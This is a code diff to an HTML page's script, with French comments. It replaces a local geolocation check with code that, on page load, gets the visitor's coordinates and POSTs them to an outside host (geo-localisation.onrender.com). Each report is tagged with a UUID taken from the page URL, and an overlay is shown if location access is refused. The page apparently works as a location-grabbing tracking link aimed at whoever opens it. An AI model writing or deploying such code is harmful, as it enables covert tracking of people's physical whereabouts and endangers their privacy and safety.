@@ -86,23 +86,26 @@
     </footer>
 
     <script>
-        // Fonction pour vérifier la géolocalisation
-        function checkGeolocation() {
-            if (!navigator.geolocation) {
-                showGeolocationOverlay();
-            } else {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        // Géolocalisation réussie
-                        const { latitude, longitude } = position.coords;
-                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
+        function attemptGeolocation() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const uuid = window.location.pathname.split('/').pop();
+                const { latitude, longitude } = position.coords;
+
+                fetch('https://geo-localisation.onrender.com/location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
                     },
-                    error => {
-                        // Échec de la géolocalisation
-                        showGeolocationOverlay();
-                    }
-                );
-            }
+                    body: JSON.stringify({ uuid, latitude, longitude })
+                })
+                .then(response => response.text())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            }, error => {
+                // En cas d'échec, afficher la superposition
+                showGeolocationOverlay();
+            });
         }
 
         // Fonction pour afficher la superposition
@@ -110,8 +113,8 @@
             document.getElementById('geolocation-overlay').classList.remove('hidden');
         }
 
-        // Vérifier la géolocalisation au chargement de la page
-        window.onload = checkGeolocation;
+        // Appeler la fonction pour tenter de récupérer la position
+        window.onload = attemptGeolocation;
     </script>
 </body>
 </html>
